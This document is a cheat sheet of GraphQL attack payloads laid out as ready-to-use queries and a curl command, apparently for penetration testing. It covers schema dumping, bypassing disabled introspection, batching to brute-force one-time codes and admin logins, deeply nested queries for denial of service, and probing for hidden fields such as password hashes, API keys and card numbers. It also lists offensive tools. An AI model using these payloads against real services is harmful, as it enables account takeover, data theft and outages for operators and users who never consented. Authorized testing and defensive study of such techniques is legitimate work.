# GraphQL Introspection & Abuse Queries
# Severity: MEDIUM to HIGH
# Use with: curl, Burp, InQL, GraphQL Voyager, Altair

# ============================================================
# 1. FULL INTROSPECTION QUERY
# ============================================================

# Full schema dump — paste as the "query" value in JSON POST body
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind name description fields(includeDeprecated:true){name description args{name description type{...TypeRef}defaultValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{name description type{...TypeRef}defaultValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}

# curl command:
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{kind name description fields(includeDeprecated:true){name description args{name type{...TypeRef}}type{...TypeRef}}}}}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}"}'

# ============================================================
# 2. QUICK SCHEMA RECON
# ============================================================

# List all types
{"query": "{__schema{types{name kind description}}}"}

# List all queries
{"query": "{__schema{queryType{fields{name description args{name type{name kind}}}}}}"}

# List all mutations
{"query": "{__schema{mutationType{fields{name description args{name type{name kind ofType{name}}}}}}}"}

# List all subscriptions
{"query": "{__schema{subscriptionType{fields{name description}}}}"}

# Get specific type details
{"query": "{__type(name:\"User\"){name fields{name type{name kind ofType{name}}}}}"}
{"query": "{__type(name:\"Query\"){name fields{name type{name}}}}"}
{"query": "{__type(name:\"Mutation\"){name fields{name type{name}}}}"}

# ============================================================
# 3. INTROSPECTION BYPASS (When Disabled)
# ============================================================

# Try GET instead of POST
GET /graphql?query={__schema{types{name}}}

# Newline/tab obfuscation
{"query": "{\n__schema\n{\ntypes\n{\nname\n}\n}\n}"}
{"query": "{\t__schema\t{\ttypes\t{\tname\t}\t}\t}"}

# Field suggestion abuse (some servers suggest fields on typo)
{"query": "{__schem}"}
{"query": "{__typ}"}
{"query": "{user{passwor}}"}

# Alias to hide introspection
{"query": "{a:__schema{types{name}}}"}

# Fragment-based introspection
{"query": "{...F} fragment F on Query{__schema{types{name}}}"}

# Using __type instead of __schema
{"query": "{__type(name:\"Query\"){fields{name}}}"}
{"query": "{__type(name:\"Mutation\"){fields{name}}}"}

# Persisted queries (if the server uses them, the hash might work)
{"extensions": {"persistedQuery": {"version": 1, "sha256Hash": "ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"}}}

# ============================================================
# 4. QUERY BATCHING ATTACKS
# ============================================================

# Array batching — multiple queries in one request
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"},
  {"query": "{ user(id: 4) { email } }"},
  {"query": "{ user(id: 5) { email } }"}
]

# Brute-force OTP via batching
[
  {"query": "mutation { verifyOTP(code: \"000000\") { success } }"},
  {"query": "mutation { verifyOTP(code: \"000001\") { success } }"},
  {"query": "mutation { verifyOTP(code: \"000002\") { success } }"},
  {"query": "mutation { verifyOTP(code: \"000003\") { success } }"},
  {"query": "mutation { verifyOTP(code: \"000004\") { success } }"}
]

# Login brute-force via batching
[
  {"query": "mutation { login(email: \"admin@target.com\", password: \"password1\") { token } }"},
  {"query": "mutation { login(email: \"admin@target.com\", password: \"password2\") { token } }"},
  {"query": "mutation { login(email: \"admin@target.com\", password: \"123456\") { token } }"}
]

# Alias batching — multiple operations in one query
{
  "query": "mutation { a1: login(email: \"admin@target.com\", password: \"pass1\") { token } a2: login(email: \"admin@target.com\", password: \"pass2\") { token } a3: login(email: \"admin@target.com\", password: \"pass3\") { token } }"
}

# ============================================================
# 5. NESTED QUERY DoS (Query Depth Attack)
# ============================================================

# Deeply nested query (adjust depth based on target)
{"query": "{ user(id: 1) { friends { friends { friends { friends { friends { friends { friends { friends { friends { friends { id name } } } } } } } } } } } }"}

# Circular reference abuse
{"query": "{ user(id: 1) { posts { author { posts { author { posts { author { id } } } } } } } }"}

# Wide query (many fields)
{"query": "{ users { id email name address phone role createdAt updatedAt lastLogin avatar bio company location website twitter github linkedin } }"}

# Combination: deep + wide
{"query": "{ users { id email posts { id title body comments { id body author { id email posts { id title comments { id body } } } } } } }"}

# ============================================================
# 6. FIELD ENUMERATION
# ============================================================

# Discover hidden fields by querying known types
{"query": "{ user(id: 1) { id email password passwordHash apiKey secretKey token ssn creditCard } }"}

# Check for debug/internal fields
{"query": "{ user(id: 1) { __typename id _id internalId debug _debug } }"}

# Enumerate via error messages
# Send an invalid field — the error might suggest valid ones
{"query": "{ user(id: 1) { nonexistent_field } }"}

# ============================================================
# 7. TOOLS
# ============================================================

# GraphQL Voyager: visual schema from introspection
# InQL (Burp extension): automated introspection + query generation
# Altair GraphQL Client: desktop client with history
# graphql-path-enum: enumerate paths between types
# BatchQL: automated batching attack tool
# CrackQL: alias-based brute-forcing
# graphw00f: fingerprint GraphQL server engine
